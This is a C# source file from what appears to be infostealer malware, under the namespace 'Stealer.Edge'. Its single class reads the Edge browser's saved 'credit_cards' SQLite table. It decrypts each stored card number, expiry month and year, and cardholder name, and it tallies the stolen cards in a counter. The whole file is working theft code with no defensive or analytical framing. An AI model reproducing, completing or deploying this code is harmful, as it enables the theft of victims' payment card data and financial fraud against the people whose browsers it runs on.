using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Edge;

internal sealed class CreditCards
{
	public static List<CreditCard> Get(string sWebData)
	{
		try
		{
			List<CreditCard> list = new List<CreditCard>();
			if (!File.Exists(sWebData))
			{
				return list;
			}
			SQLite sQLite = SqlReader.ReadTable(sWebData, "credit_cards");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				CreditCard item = default(CreditCard);
				item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sQLite.GetValue(i, 4)));
				item.sExpYear = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sQLite.GetValue(i, 3)));
				item.sExpMonth = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sQLite.GetValue(i, 2)));
				item.sName = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sQLite.GetValue(i, 1)));
				Counter.CreditCards++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return new List<CreditCard>();
		}
	}
}
